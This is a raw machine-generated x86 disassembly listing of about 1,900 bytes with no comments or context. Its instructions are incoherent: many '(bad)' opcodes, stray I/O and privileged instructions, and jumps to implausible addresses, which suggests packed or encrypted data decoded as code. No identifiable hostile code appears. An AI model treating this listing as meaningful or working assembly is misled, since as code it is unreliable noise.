  404b8e:	call   DWORD PTR [edx]
  404b90:	mov    bh,0xff
  404b92:	pop    eax
  404b93:	inc    esp
  404b94:	and    al,0x9e
  404b96:	inc    ebx
  404b97:	push   ebx
  404b98:	in     eax,dx
  404b99:	ror    DWORD PTR [ecx+0x3c],1
  404b9c:	cmc    
  404b9d:	ror    ebp,0x82
  404ba0:	nop
  404ba1:	mov    eax,ds:0xe57aa947
  404ba6:	xor    DWORD PTR [esi],ebp
  404ba8:	sub    eax,0x1b00cdb
  404bad:	adc    cl,BYTE PTR [edx+0x7a376798]
  404bb3:	inc    edi
  404bb4:	stos   DWORD PTR es:[edi],eax
  404bb5:	stos   BYTE PTR es:[edi],al
  404bb6:	ss in  al,0x44
  404bb9:	cmp    DWORD PTR [esi-0x2653f9b9],ebx
  404bbf:	gs test al,0x1f
  404bc2:	adc    al,0xfa
  404bc4:	mov    eax,esi
  404bc6:	pop    esp
  404bc7:	outs   dx,BYTE PTR ds:[esi]
  404bc8:	retf   0x22a
  404bcb:	push   cs
  404bcc:	data16 adc BYTE PTR [edx-0x2a],cl
  404bd0:	dec    esp
  404bd1:	imul   edi,eax,0xffffffcb
  404bd4:	daa    
  404bd5:	xor    eax,0x19efc47e
  404bda:	inc    edi
  404bdb:	push   cs
  404bdc:	cs (bad) 
  404bde:	jnp    0x404bdd
  404be0:	mov    al,BYTE PTR [ecx-0x5ffccade]
  404be6:	xchg   ebp,eax
  404be7:	cmp    esi,DWORD PTR [ebp-0x5d]
  404bea:	mov    eax,ds:0x1f5e8606
  404bef:	aaa    
  404bf0:	mov    DWORD PTR [edx],esp
  404bf2:	push   ebx
  404bf3:	cli    
  404bf4:	dec    esi
  404bf5:	xchg   edi,eax
  404bf6:	inc    esi
  404bf7:	mov    DWORD PTR [edi-0x22],0xff11bd4a
  404bfe:	shl    bl,cl
  404c00:	cmc    
  404c01:	scas   al,BYTE PTR es:[edi]
  404c02:	std    
  404c03:	mov    ebx,0xbfc0ddb5
  404c08:	inc    ebp
  404c09:	pop    ebp
  404c0a:	test   DWORD PTR [eax],ecx
  404c0c:	adc    eax,ebp
  404c0e:	sbb    dl,BYTE PTR [eax+eiz*4+0x7bb30cbe]
  404c15:	xchg   ecx,eax
  404c16:	xor    eax,0x900842fc
  404c1b:	push   esp
  404c1c:	(bad)  
  404c1d:	in     eax,0xdc
  404c1f:	jmp    0x404c7c
  404c21:	mov    edx,0x333974ae
  404c26:	ins    DWORD PTR es:[edi],dx
  404c27:	sbb    al,0x41
  404c29:	push   ss
  404c2a:	rcr    DWORD PTR [ecx],0xb3
  404c2d:	stos   DWORD PTR es:[edi],eax
  404c2e:	sbb    al,0xa
  404c30:	cmp    esi,ecx
  404c32:	leave  
  404c33:	scas   al,BYTE PTR es:[edi]
  404c34:	mov    bh,0x6d
  404c36:	ins    BYTE PTR es:[edi],dx
  404c37:	mov    ah,0xa6
  404c39:	mov    ah,0x17
  404c3b:	adc    edi,edx
  404c3d:	dec    edi
  404c3e:	popa   
  404c3f:	push   ebx
  404c40:	popf   
  404c41:	js     0x404bf1
  404c43:	mov    ch,0xeb
  404c45:	iret   
  404c46:	hlt    
  404c47:	test   BYTE PTR [edx],0x1f
  404c4a:	or     DWORD PTR [ebx+0x591c2abc],0x7c
  404c51:	add    dl,BYTE PTR [edi+ecx*4+0x694959fb]
  404c58:	sbb    edx,0xffffff84
  404c5b:	out    dx,eax
  404c5c:	pop    ss
  404c5d:	cli    
  404c5e:	pop    ecx
  404c5f:	xchg   edi,eax
  404c60:	xor    dl,bh
  404c62:	xchg   esi,eax
  404c63:	in     al,0x90
  404c65:	loopne 0x404c4c
  404c67:	mov    cl,0xc4
  404c69:	test   DWORD PTR [ebp+0x1eb586a2],0x4103b5e1
  404c73:	or     BYTE PTR [ebx],0x6
  404c76:	or     BYTE PTR [esi-0x5ead8427],bh
  404c7c:	add    ebp,DWORD PTR [ebp+edi*1+0x4d07a66e]
  404c83:	and    edx,DWORD PTR [eax]
  404c85:	and    dl,0x45
  404c88:	mov    al,ds:0x6d103a98
  404c8d:	fisub  WORD PTR [ebx+0x12]
  404c90:	js     0x404c7d
  404c92:	jb     0x404c1f
  404c94:	enter  0x893f,0x10
  404c98:	popf   
  404c99:	nop
  404c9a:	adc    BYTE PTR ds:0x7a537e06,cl
  404ca0:	jbe    0x404d0c
  404ca2:	outs   dx,BYTE PTR ds:[esi]
  404ca3:	jl     0x404c9f
  404ca5:	jnp    0x404cd9
  404ca7:	xchg   esi,eax
  404ca8:	cwde   
  404ca9:	mov    cl,0x12
  404cab:	popf   
  404cac:	shr    BYTE PTR [ebx-0x8],cl
  404caf:	push   ecx
  404cb0:	jl     0x404c6d
  404cb2:	add    al,0x78
  404cb4:	(bad)  
  404cb5:	xchg   edx,eax
  404cb6:	inc    ecx
  404cb7:	pop    esi
  404cb8:	jo     0x404c42
  404cba:	adc    DWORD PTR [edi],0x99604347
  404cc0:	pop    edi
  404cc1:	adc    bl,BYTE PTR [ebx]
  404cc3:	sub    DWORD PTR [edi],eax
  404cc5:	inc    esp
  404cc6:	lods   eax,DWORD PTR ds:[esi]
  404cc7:	lods   al,BYTE PTR ds:[esi]
  404cc8:	cmp    ch,BYTE PTR [esi-0x6da7af7e]
  404cce:	repz clc 
  404cd0:	and    BYTE PTR [ebx],0xf9
  404cd3:	adc    DWORD PTR ss:[ecx-0x2e],eax
  404cd7:	aas    
  404cd8:	sub    al,0x81
  404cda:	mov    ds:0x81624a8f,eax
  404cdf:	(bad)  [edx-0x44e3c4a4]
  404ce5:	sbb    ch,BYTE PTR [esi-0x63b19f08]
  404ceb:	lods   eax,DWORD PTR ds:[esi]
  404cec:	lea    edx,[esi+0x1d7beb9e]
  404cf2:	sbb    al,0x29
  404cf4:	sbb    DWORD PTR [esp+esi*4+0x1829d3b5],edx
  404cfb:	out    dx,eax
  404cfc:	call   0xe5d14f96
  404d01:	jbe    0x404d56
  404d03:	div    DWORD PTR [edi]
  404d05:	mov    ebx,0x68e6ea08
  404d0a:	sub    ch,BYTE PTR [ebp-0x6b55b15d]
  404d10:	mov    esp,0xa4e47700
  404d15:	ret    
  404d16:	mov    esi,0x7e463ed9
  404d1b:	inc    eax
  404d1c:	add    BYTE PTR [esi],al
  404d1e:	or     eax,0x6c909d4a
  404d23:	jo     0x404d03
  404d25:	test   BYTE PTR [edx+ebp*8-0xb29bd2e],0x8d
  404d2d:	aam    0x53
  404d2f:	and    al,0xcc
  404d31:	in     eax,dx
  404d32:	jb     0x404cf0
  404d34:	add    DWORD PTR [edi],edi
  404d36:	fnstcw WORD PTR [ecx+0x338888bd]
  404d3c:	lock rcr DWORD PTR ds:0xcd86250,0x93
  404d44:	mov    ebp,DWORD PTR [edi]
  404d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d47:	fcmovbe st,st(4)
  404d49:	push   cs
  404d4a:	jge    0x404d36
  404d4c:	repz mov edx,0x3d244377
  404d52:	cmp    bh,BYTE PTR [ecx+0xdfea8ea]
  404d58:	clc    
  404d59:	mov    esp,edx
  404d5b:	rcr    DWORD PTR [ebx+0x10],1
  404d5e:	mov    WORD PTR [esp+ebp*2-0xadbff23],cs
  404d65:	leave  
  404d66:	cmp    DWORD PTR [eax],ebp
  404d68:	mov    gs,WORD PTR [esi+0x76]
  404d6b:	mov    ebx,0x3a68eea0
  404d70:	add    BYTE PTR [edx+0x6f],bh
  404d73:	dec    ebx
  404d74:	test   eax,0xb73bba1f
  404d79:	loop   0x404db0
  404d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d7c:	mov    dh,0x12
  404d7e:	imul   edi,esp,0x64447b7d
  404d84:	pop    esi
  404d85:	or     BYTE PTR [edi],al
  404d87:	jecxz  0x404d26
  404d89:	push   ss
  404d8a:	sub    DWORD PTR [eax-0x12cdf6fe],esi
  404d90:	cmp    eax,0xe57e929b
  404d95:	inc    ebx
  404d96:	outs   dx,BYTE PTR ds:[esi]
  404d97:	pop    esi
  404d98:	(bad)  
  404d99:	packuswb mm7,QWORD PTR [eax+0x24]
  404d9d:	lods   eax,DWORD PTR gs:[esi]
  404d9f:	adc    al,0x61
  404da1:	jne    0x404d99
  404da3:	adc    DWORD PTR [edx],edx
  404da5:	pushf  
  404da6:	sbb    DWORD PTR [edi],eax
  404da8:	fadd   QWORD PTR [edi-0x5e35113f]
  404dae:	addr16 push cs
  404db0:	jb     0x404deb
  404db2:	add    esp,DWORD PTR [eax-0x36]
  404db5:	ja     0x404db0
  404db7:	sub    eax,ebx
  404db9:	popa   
  404dba:	sub    ebp,edx
  404dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dbd:	pushf  
  404dbe:	lahf   
  404dbf:	mov    eax,ds:0xf75bd5c4
  404dc4:	scas   eax,DWORD PTR es:[edi]
  404dc5:	jecxz  0x404e0f
  404dc7:	adc    eax,0x3d6a47f2
  404dcc:	jnp    0x404dda
  404dce:	and    dl,BYTE PTR [eax+edx*4+0x4b132435]
  404dd5:	add    bh,BYTE PTR [esi]
  404dd7:	fsub   QWORD PTR [eax+0x6265feef]
  404ddd:	sub    BYTE PTR [esi+0x47],bl
  404de0:	ret    
  404de1:	das    
  404de2:	cmp    eax,0x80d5757a
  404de7:	inc    ebp
  404de8:	adc    ecx,esi
  404dea:	xchg   esp,eax
  404deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dec:	jne    0x404e23
  404dee:	jno    0x404d9e
  404df0:	(bad)  
  404df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404df2:	adc    esi,edx
  404df4:	inc    esp
  404df5:	jl     0x404e0c
  404df7:	push   cs
  404df8:	sub    BYTE PTR ds:0x16f93107,cl
  404dfe:	cmp    DWORD PTR fs:[edx+ebx*1-0x7eb7751],edi
  404e06:	in     eax,dx
  404e07:	push   esi
  404e08:	nop
  404e09:	mov    bh,0x4c
  404e0b:	shr    BYTE PTR [edx-0x21326105],1
  404e11:	stos   DWORD PTR es:[edi],eax
  404e12:	mov    ds:0xc926d74b,eax
  404e17:	or     eax,0x73acf1ab
  404e1c:	hlt    
  404e1d:	mov    DWORD PTR [esi],0x7d9c0979
  404e23:	mov    esi,0x3afc0573
  404e28:	push   edi
  404e29:	lock push ecx
  404e2b:	icebp  
  404e2c:	add    eax,0x803f9598
  404e31:	outs   dx,BYTE PTR ds:[esi]
  404e32:	rdpmc  
  404e34:	cmp    DWORD PTR [esi-0x27],ecx
  404e37:	cmp    BYTE PTR [ebx],al
  404e39:	inc    esi
  404e3a:	and    BYTE PTR es:[esi+0x64],0xdd
  404e3f:	dec    esi
  404e40:	cwde   
  404e41:	pushf  
  404e42:	aas    
  404e43:	dec    ebx
  404e44:	in     eax,0x87
  404e46:	cmp    eax,0x20c318fa
  404e4b:	sub    ecx,DWORD PTR ds:[esi-0xe29078f]
  404e52:	and    al,0x95
  404e54:	xlat   BYTE PTR ds:[ebx]
  404e55:	fadd   DWORD PTR [edx]
  404e57:	mov    ecx,0x6b9c9196
  404e5d:	jbe    0x404ea7
  404e5f:	xchg   ebx,eax
  404e60:	mov    edi,0x53640bfc
  404e65:	std    
  404e66:	jbe    0x404e94
  404e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e69:	mov    esi,ecx
  404e6b:	or     al,0xe7
  404e6d:	lahf   
  404e6e:	or     BYTE PTR [ecx-0x1f83d6a4],al
  404e74:	scas   al,BYTE PTR es:[edi]
  404e75:	ss mov ch,0xe
  404e78:	loopne 0x404ee5
  404e7a:	jmp    0xd452d772
  404e7f:	addr16 in eax,0x3e
  404e82:	add    eax,0xa68c9151
  404e87:	jp     0x404eef
  404e89:	mov    edi,0x499954e9
  404e8e:	mov    dl,0x32
  404e90:	xchg   edx,eax
  404e91:	sub    edx,ebx
  404e93:	mov    ecx,0xc2d2bd4a
  404e98:	pop    edi
  404e99:	aas    
  404e9a:	sahf   
  404e9b:	push   esi
  404e9c:	mov    bh,0xd4
  404e9e:	int    0x29
  404ea0:	test   DWORD PTR [esi-0x4a],0xc0f35041
  404ea7:	ss test al,0x93
  404eaa:	mov    ds:0xdb167c9d,eax
  404eaf:	or     al,0xec
  404eb1:	ja     0x404f2d
  404eb3:	clc    
  404eb4:	retf   0xd4e9
  404eb7:	iret   
  404eb8:	inc    esp
  404eb9:	mov    ah,0x7d
  404ebb:	std    
  404ebc:	mov    ah,0xd6
  404ebe:	or     BYTE PTR [ebp-0x2f],al
  404ec1:	and    DWORD PTR [esp+edi*8],esi
  404ec4:	mov    ebx,0x92e0a099
  404ec9:	mov    esi,0x7c5ea92c
  404ece:	out    0x22,eax
  404ed0:	jge    0x404ecc
  404ed2:	xchg   ecx,eax
  404ed3:	xchg   ecx,edi
  404ed5:	outs   dx,BYTE PTR ds:[esi]
  404ed6:	fucom  st(2)
  404ed8:	into   
  404ed9:	xor    al,0x98
  404edb:	(bad)  
  404edc:	das    
  404edd:	cs mov ebp,0x9cf3f83e
  404ee3:	loope  0x404e8f
  404ee5:	(bad)  [edx-0x75d2238b]
  404eeb:	jg     0x404eb4
  404eed:	test   BYTE PTR [ebx-0x79],cl
  404ef0:	not    DWORD PTR [ebx-0x132a46dc]
  404ef6:	enter  0x5ce5,0x6a
  404efa:	dec    ecx
  404efb:	je     0x404f0f
  404efd:	xor    DWORD PTR [esi],ebx
  404eff:	add    DWORD PTR [edi+0x58],eax
  404f02:	dec    ebx
  404f03:	inc    esp
  404f04:	scas   eax,DWORD PTR es:[edi]
  404f05:	bound  edx,QWORD PTR [ecx-0x4a]
  404f08:	cmp    BYTE PTR [esi],dh
  404f0a:	dec    ecx
  404f0b:	jns    0x404ed1
  404f0d:	retf   0x3326
  404f10:	pop    esi
  404f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f12:	push   esi
  404f13:	fdivr  QWORD PTR [edx+ecx*1+0x26]
  404f17:	inc    esp
  404f18:	mov    al,ds:0xe1e415c4
  404f1d:	mov    eax,0x286d5730
  404f22:	shr    BYTE PTR gs:[esi-0x474f66ad],cl
  404f29:	jp     0x404f96
  404f2b:	jno    0x404f9b
  404f2d:	into   
  404f2e:	cwde   
  404f2f:	icebp  
  404f30:	sbb    al,0x85
  404f32:	int    0xab
  404f34:	jl     0x404f1f
  404f36:	mov    eax,0x6f5589c6
  404f3b:	xor    BYTE PTR [edi+0x19],dl
  404f3e:	ds loopne 0x404f6b
  404f41:	iret   
  404f42:	fimul  WORD PTR [edi+0x6d]
  404f45:	mov    esi,0x9d6fe5fb
  404f4a:	ss dec esi
  404f4c:	xor    eax,0xd2ec0fad
  404f51:	add    edx,DWORD PTR [edi-0x17]
  404f54:	mov    eax,ds:0x1cb89ce1
  404f59:	shl    DWORD PTR [edx+0x58],cl
  404f5c:	jl     0x404fab
  404f5e:	dec    esi
  404f5f:	pop    ds
  404f60:	jge    0x404ef0
  404f62:	mov    cl,0x8
  404f64:	mov    cl,BYTE PTR [esi]
  404f66:	mov    bh,0xd7
  404f68:	call   0xd651:0x5042463
  404f6f:	jmp    0x6066:0x255d1ea1
  404f76:	outs   dx,BYTE PTR ds:[esi]
  404f77:	mov    eax,ds:0x2555b6c4
  404f7c:	cli    
  404f7d:	mov    ch,0x2b
  404f7f:	jecxz  0x404fa7
  404f81:	cmp    BYTE PTR [ebp-0x49],bl
  404f84:	jg     0x404ff4
  404f86:	mov    ah,0x37
  404f88:	sar    BYTE PTR [edx+0x8],cl
  404f8b:	lods   al,BYTE PTR ds:[esi]
  404f8c:	cli    
  404f8d:	pusha  
  404f8e:	loop   0x404f36
  404f90:	test   al,0xf9
  404f92:	ret    0xd5f6
  404f95:	(bad)
  404f98:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  404f9a:	mov    bl,0x78
  404f9c:	or     bh,BYTE PTR [ebp+0x53]
  404f9f:	ja     0x404fea
  404fa1:	push   0x2e
  404fa3:	stos   DWORD PTR es:[edi],eax
  404fa4:	inc    ebp
  404fa5:	mov    cl,0x75
  404fa7:	(bad)  
  404fa8:	aad    0xe1
  404faa:	fcomp  DWORD PTR [esi]
  404fac:	push   ecx
  404fad:	leave  
  404fae:	out    0x26,al
  404fb0:	pop    ebx
  404fb1:	and    eax,0x63f451e2
  404fb6:	mov    esp,0xc41f1b59
  404fbb:	mov    eax,ds:0x73646726
  404fc0:	mov    ebx,0x9d95f7a3
  404fc5:	aas    
  404fc6:	push   0x20811152
  404fcb:	push   eax
  404fcc:	data16 (bad) 
  404fce:	inc    ebp
  404fcf:	imul   eax,DWORD PTR [edi-0x49],0xffffff88
  404fd3:	sub    DWORD PTR ds:0x4ec7277c,esi
  404fd9:	outs   dx,BYTE PTR ds:[esi]
  404fda:	jnp    0x404fd5
  404fdc:	mov    bl,0x12
  404fde:	inc    ecx
  404fdf:	sti    
  404fe0:	xor    eax,0x30373a6f
  404fe5:	jmp    0x404fec
  404fe7:	loopne 0x405066
  404fe9:	cmc    
  404fea:	sbb    eax,0xb23504f5
  404fef:	jne    0x404fc4
  404ff1:	shrd   DWORD PTR [edi+0x43],ecx,cl
  404ff5:	cmp    cl,BYTE PTR [ebx]
  404ff7:	sub    ebp,0x3cea2bf8
  404ffd:	and    DWORD PTR [eax-0x10bf0b88],ecx
  405003:	leave  
  405004:	xor    eax,0x8cd7f51b
  405009:	inc    esp
  40500a:	stos   DWORD PTR es:[edi],eax
  40500b:	mov    esi,0x4a158b37
  405010:	loope  0x404ff6
  405012:	scas   al,BYTE PTR es:[edi]
  405013:	xchg   esi,eax
  405014:	and    ch,BYTE PTR [ecx-0x537fa123]
  40501a:	(bad)  
  40501b:	and    DWORD PTR [eax+0x40],esp
  40501e:	js     0x404fa5
  405020:	mov    WORD PTR [ebx+0x69],fs
  405023:	ret    
  405024:	xchg   BYTE PTR [esi-0x2c],cl
  405027:	pop    ebx
  405028:	ins    DWORD PTR es:[edi],dx
  405029:	adc    BYTE PTR [eax-0x55793546],dh
  40502f:	push   ecx
  405030:	cld    
  405031:	cmp    al,BYTE PTR [eax-0x700334bb]
  405037:	mov    ecx,0x2ea8d3a5
  40503c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40503d:	scas   al,BYTE PTR es:[edi]
  40503e:	push   ds
  40503f:	xchg   edi,eax
  405040:	adc    eax,0x5974120a
  405045:	int    0xeb
  405047:	sar    BYTE PTR [eax+0x261fdf9c],cl
  40504d:	retf   0xb852
  405050:	into   
  405051:	mov    ah,ah
  405053:	sti    
  405054:	fwait
  405055:	mov    al,ds:0xc7a037af
  40505a:	(bad)  
  40505b:	outs   dx,BYTE PTR ds:[esi]
  40505c:	mov    eax,0x6a62d932
  405061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405062:	sub    dl,BYTE PTR [eax+edi*2]
  405065:	mov    BYTE PTR [esi],cl
  405067:	cmp    eax,DWORD PTR fs:[ebx+eiz*2+0x2085b5d3]
  40506f:	pop    eax
  405070:	adc    esp,eax
  405072:	push   ebx
  405073:	jg     0x404ff7
  405075:	pop    esp
  405076:	add    DWORD PTR [edx-0x62],ebp
  405079:	cmp    eax,0xc824a011
  40507e:	mov    ds:0x626eda73,al
  405083:	xchg   edx,eax
  405084:	not    DWORD PTR [ecx+0x5865924]
  40508a:	mov    DWORD PTR [ebp-0x7],esi
  40508d:	icebp  
  40508e:	xchg   esp,eax
  40508f:	mov    edx,0xcc8dcca8
  405094:	stos   DWORD PTR es:[edi],eax
  405095:	(bad)  
  405096:	rol    DWORD PTR [esp+ecx*2],0x57
  40509a:	pop    ss
  40509b:	mov    esi,0x3a8b88a7
  4050a0:	je     0x40502a
  4050a2:	xor    eax,DWORD PTR [edi-0x3f42b1a7]
  4050a8:	pop    eax
  4050a9:	jecxz  0x405112
  4050ab:	sub    BYTE PTR [esi-0x28],cl
  4050ae:	pop    edx
  4050af:	int    0x49
  4050b1:	addr16 jb 0x40507b
  4050b4:	mov    DWORD PTR [ecx+0x490e583c],0xf0d575
  4050be:	subps  xmm4,XMMWORD PTR [eax-0x2e]
  4050c2:	mov    al,0xa8
  4050c4:	xor    al,0x8c
  4050c6:	rcr    DWORD PTR [edx-0x2f52b662],cl
  4050cc:	ins    DWORD PTR es:[edi],dx
  4050cd:	fwait
  4050ce:	xchg   ebx,eax
  4050cf:	shl    BYTE PTR [ebx+0x46],1
  4050d2:	retf   
  4050d3:	mov    ch,0x77
  4050d5:	mov    edx,0x150e7671
  4050da:	jl     0x4050d9
  4050dc:	daa    
  4050dd:	or     DWORD PTR [ebp-0x25ec12d6],esi
  4050e3:	inc    eax
  4050e4:	pop    ss
  4050e5:	xor    DWORD PTR [esi+0x75],ecx
  4050e8:	mov    ecx,0xb5ba86ec
  4050ed:	repz sbb eax,0xcf116ae1
  4050f3:	fadd   DWORD PTR ds:0x464519f
  4050f9:	sub    ch,BYTE PTR [ebx-0x2c38af3f]
  4050ff:	xchg   ebp,eax
  405100:	mov    ebp,0x84558853
  405105:	mov    ds:0xabea21f7,al
  40510a:	fdiv   QWORD PTR [esi+0x61ff17bd]
  405110:	jno    0x4050da
  405112:	or     eax,0xa9fc8a2e
  405117:	das    
  405118:	sub    DWORD PTR [eax+0xc],esp
  40511b:	sub    BYTE PTR [ebx+ebx*1],bh
  40511e:	cmp    al,0xf6
  405120:	into   
  405121:	mov    edi,0x4fe46fa2
  405126:	sub    al,0x7a
  405128:	cmp    al,0x4d
  40512a:	xchg   edi,eax
  40512b:	push   es
  40512c:	bound  eax,QWORD PTR [ebx]
  40512e:	or     edx,DWORD PTR [edx-0x61]
  405131:	mov    ah,BYTE PTR [edi-0x32ee6551]
  405137:	push   ebx
  405138:	push   0xffffffcd
  40513a:	ds xor eax,0x7fc37faa
  405140:	jns    0x405148
  405142:	xchg   esp,eax
  405143:	sub    DWORD PTR [eax+0x67],0xffffffd2
  405147:	pop    edi
  405148:	mul    BYTE PTR [edi]
  40514a:	out    0x4b,eax
  40514c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40514d:	xchg   bx,ax
  40514f:	sbb    eax,0xf8939b6f
  405154:	inc    eax
  405155:	pushf  
  405156:	(bad)  
  405157:	aam    0xe7
  405159:	enter  0xd5e6,0x3
  40515d:	pop    es
  40515e:	mov    ch,0xd1
  405160:	imul   DWORD PTR [ebx]
  405162:	(bad)  
  405163:	fadd   DWORD PTR [edi*1+0x752557d6]
  40516a:	adc    eax,0xbf5d2700
  40516f:	jo     0x4051a6
  405171:	int    0xad
  405173:	cmp    eax,0xde530990
  405178:	push   edi
  405179:	inc    edi
  40517a:	jbe    0x405157
  40517c:	ds stos BYTE PTR es:[edi],al
  40517e:	test   al,0x11
  405180:	push   ecx
  405181:	imul   edi,DWORD PTR [edi-0x61],0x72
  405185:	loopne 0x4051e8
  405187:	xchg   esp,eax
  405188:	pop    ecx
  405189:	(bad)  
  40518a:	jns    0x405134
  40518c:	repnz sbb DWORD PTR [edx-0x6b],ebx
  405190:	adc    BYTE PTR [eax-0x6095af5f],bl
  405196:	icebp  
  405197:	out    0xe8,eax
  405199:	dec    ecx
  40519a:	jecxz  0x405219
  40519c:	aas    
  40519d:	pop    ebp
  40519e:	jnp    0x4051ba
  4051a0:	jle    0x405186
  4051a2:	gs push esi
  4051a4:	xchg   esp,eax
  4051a5:	es pop edi
  4051a7:	push   esp
  4051a8:	pop    es
  4051a9:	push   ebx
  4051aa:	aas    
  4051ab:	add    eax,0xe986c9d2
  4051b0:	int3   
  4051b1:	daa    
  4051b2:	mov    al,ds:0x489eee96
  4051b7:	out    dx,al
  4051b8:	enter  0xe96d,0x70
  4051bc:	push   ss
  4051bd:	inc    esi
  4051be:	outs   dx,BYTE PTR ds:[esi]
  4051bf:	addr16 mov bl,bh
  4051c2:	lea    ecx,gs:[esi+0x2c25e06a]
  4051c9:	retf   0x373e
  4051cc:	pop    esp
  4051cd:	sub    eax,0x9f2ba417
  4051d2:	push   edi
  4051d3:	push   eax
  4051d4:	je     0x405175
  4051d6:	mov    ch,0x20
  4051d8:	jp     0x405228
  4051da:	xchg   esp,eax
  4051db:	xor    eax,0x7bb7594e
  4051e0:	(bad)  
  4051e1:	dec    DWORD PTR [ebx]
  4051e3:	sti    
  4051e4:	xchg   BYTE PTR [esi],dl
  4051e6:	mov    dl,0x4e
  4051e8:	mov    WORD PTR [esp+eiz*4+0x4e],ss
  4051ec:	lahf   
  4051ed:	fnstsw WORD PTR [ebp-0x4c2783e5]
  4051f3:	fisubr WORD PTR [ebx]
  4051f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051f6:	adc    al,0x7c
  4051f8:	xchg   ebx,eax
  4051f9:	inc    edx
  4051fa:	dec    eax
  4051fb:	adc    al,0x6e
  4051fd:	test   DWORD PTR ds:0x5767b4a5,ecx
  405203:	mov    ebp,0xa2c7767c
  405208:	jb     0x405195
  40520a:	xor    al,0x75
  40520c:	jbe    0x405277
  40520e:	fmul   st,st(4)
  405210:	sar    esp,0xbb
  405213:	or     BYTE PTR [eax+edi*8-0x1c],bl
  405217:	outs   dx,BYTE PTR ds:[esi]
  405218:	sub    eax,0xc5b8530b
  40521d:	push   0xfffffff7
  40521f:	jnp    0x405277
  405221:	jl     0x405200
  405223:	lods   al,BYTE PTR ds:[esi]
  405224:	sub    ebx,DWORD PTR [ebx-0x15]
  405227:	inc    esi
  405228:	or     eax,0x83e49482
  40522d:	imul   esp,DWORD PTR [ebx+0x445100e6],0x70
  405234:	mov    ch,0x31
  405236:	or     BYTE PTR [edi+0x72b8fed0],bh
  40523c:	pop    ds
  40523d:	add    DWORD PTR [eax],eax
  40523f:	icebp  
  405240:	jl     0x40526e
  405242:	adc    edi,DWORD PTR [ebp+eiz*8+0x25]
  405246:	jmp    DWORD PTR [edx-0xf94f4d3]
  40524c:	sub    ebp,DWORD PTR [edi+0x139ba335]
  405252:	inc    ecx
  405253:	pop    ecx
  405254:	clc    
  405255:	xor    ebp,DWORD PTR [esi+esi*2]
  405258:	add    DWORD PTR [eax],ebx
  40525a:	aas    
  40525b:	add    eax,0x6df7d3a3
  405260:	inc    ecx
  405261:	mov    dh,0x4c
  405263:	fisttp DWORD PTR [eax]
  405265:	or     al,0x53
  405267:	outs   dx,DWORD PTR ds:[esi]
  405268:	outs   dx,BYTE PTR ds:[esi]
  405269:	mov    ah,0xbe
  40526b:	or     eax,0x86e32fca
  405270:	scas   al,BYTE PTR es:[edi]
  405271:	xchg   ecx,eax
  405272:	fs bnd jae 0x4052e6
  405276:	enter  0x19a9,0xb8
  40527a:	pusha  
  40527b:	fbld   TBYTE PTR [ebx+edi*8+0x7fd3a6d3]
  405282:	mov    ebp,0x5e43f46
  405287:	es dec sp
  40528a:	fbld   TBYTE PTR [eax+0x7b]
  40528d:	dec    ebp
  40528e:	push   0x9fcd590b
  405293:	or     ch,BYTE PTR [ecx-0xe9af325]
  405299:	mov    WORD PTR [ecx+0x4ebee701],cs
  40529f:	(bad)  
  4052a0:	cmp    eax,DWORD PTR [ebp+0x289ce7cd]
  4052a6:	xchg   BYTE PTR [eax-0x71],al
  4052a9:	pusha  
  4052aa:	cld    
  4052ab:	shl    al,0xdc
  4052ae:	ret    
  4052af:	in     al,0xc1
  4052b1:	ss jle 0x405307
  4052b4:	data16 out 0xf9,al
  4052b7:	sub    eax,0xefd8da87
  4052bc:	jl     0x4052d8
  4052be:	fwait
  4052bf:	xchg   ebp,eax
  4052c0:	fcomp  DWORD PTR ds:0xfecd8eda
  4052c6:	fdiv   DWORD PTR [edx-0x4dfcf1d0]
  4052cc:	aaa    
  4052cd:	add    BYTE PTR [edi-0x30],0x82
  4052d1:	mov    edx,0xe0058ecf
  4052d6:	push   ss
  4052d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052d8:	cmp    dh,bh
  4052da:	shl    BYTE PTR [eax+0x7f],cl
  4052dd:	iret   
  4052de:	or     bh,BYTE PTR [esi]
  4052e0:	out    dx,eax
  4052e1:	xor    eax,0x531c7431
  4052e6:	ror    BYTE PTR [esi+edx*4+0x48eb7e67],1
  4052ed:	adc    ch,BYTE PTR [esi-0x555ab2a8]
  4052f3:	fldln2 
  4052f6:	repz inc edx
  4052f8:	or     al,0x20
  4052fa:	cs cld 
  4052fc:	inc    eax
  4052fd:	popf   
  4052fe:	push   edx
  4052ff:	dec    esp
  405300:	fs mov ch,0x76
  405303:	dec    ecx
  405304:	pop    ebp
  405305:	test   al,dl
  405307:	fisubr DWORD PTR [eax]
  405309:	dec    ebx
  40530a:	mov    ebp,0xa19e1105
  40530f:	daa    
  405310:	nop
  405311:	sar    BYTE PTR [eax],0x43
  405314:	and    ebp,DWORD PTR [esi-0x1609814b]
  40531a:	jp     0x4052a9
  40531c:	push   ecx
  40531d:	adc    eax,0x559ec629
  405322:	popf   
  405323:	push   edx
  405324:	dec    eax
  405325:	xchg   esp,eax
  405326:	mov    dl,0xcb
  405328:	(bad)  
  40532a:	je     0x40538b
  40532c:	mov    fs,ebp
  40532e:	fs enter 0xb9ec,0x89
  405333:	adc    esi,ecx
  405335:	pop    esp
  405336:	mov    dh,0xb3
  405338:	xchg   esi,eax
  405339:	xlat   BYTE PTR ds:[ebx]
  40533a:	sub    DWORD PTR [ecx+0x4f],ebp
  40533d:	fsubr  QWORD PTR [esi]
  40533f:	inc    ebx
  405340:	lock or edi,ecx
  405343:	cmp    eax,0x72030148
  405348:	cmp    dl,BYTE PTR [ebx+0x23]
  40534b:	stc    
  40534c:	jecxz  0x405381
  40534e:	jle    0x405356
  405350:	dec    esi
  405351:	mov    edx,0x1509ea9e
  405356:	mov    al,ds:0x72b1d503
  40535b:	cmp    DWORD PTR [ecx-0xd0613c9],ebp
